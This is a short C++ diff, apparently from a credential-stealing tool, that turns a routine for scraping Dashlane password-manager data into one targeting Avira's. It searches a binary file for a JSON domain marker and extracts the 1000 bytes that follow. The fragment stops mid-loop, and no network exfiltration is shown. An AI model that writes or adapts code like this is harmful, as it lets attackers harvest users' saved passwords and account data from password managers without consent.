@@ -4,7 +4,7 @@
 #include <vector>
 #include "../core/saveFile.h"
 
-int getCredsdashlaneEntries(std::string filename) {
+int getCredsavira2(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -12,7 +12,7 @@ int getCredsdashlaneEntries(std::string filename) {
         return 1;
     }
 
-    std::string searchSequence = "{\"addresses\":[";
+    std::string searchSequence = ",\"domain\":\"";
     std::vector<char> foundData;
 
     while (!file.eof()) {
@@ -22,9 +22,9 @@ int getCredsdashlaneEntries(std::string filename) {
         if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 5000 binary characters
+                // We found the search sequence, now collect the next 1000 binary characters
                 std::vector<char> extractedData;
-                for (int i = 0; i < 5000; i++) {
+                for (int i = 0; i < 1000; i++) {
                     file.get(c);
                     if (file.eof()) {
                         break;
